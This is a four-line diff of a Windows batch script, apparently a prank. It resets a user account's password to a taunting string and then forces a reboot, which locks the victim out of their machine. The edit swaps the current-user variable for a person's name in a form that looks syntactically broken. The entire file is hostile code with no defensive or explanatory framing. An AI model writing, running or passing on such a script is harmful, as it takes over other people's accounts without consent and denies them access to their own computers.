@@ -1,4 +1,4 @@
 @echo off
-net user %username% lessgogetbeamed
+net user %Calub Viem% lessgogetbeamed
 @echo less go get beaned
 wmic os where primary=1 reboot
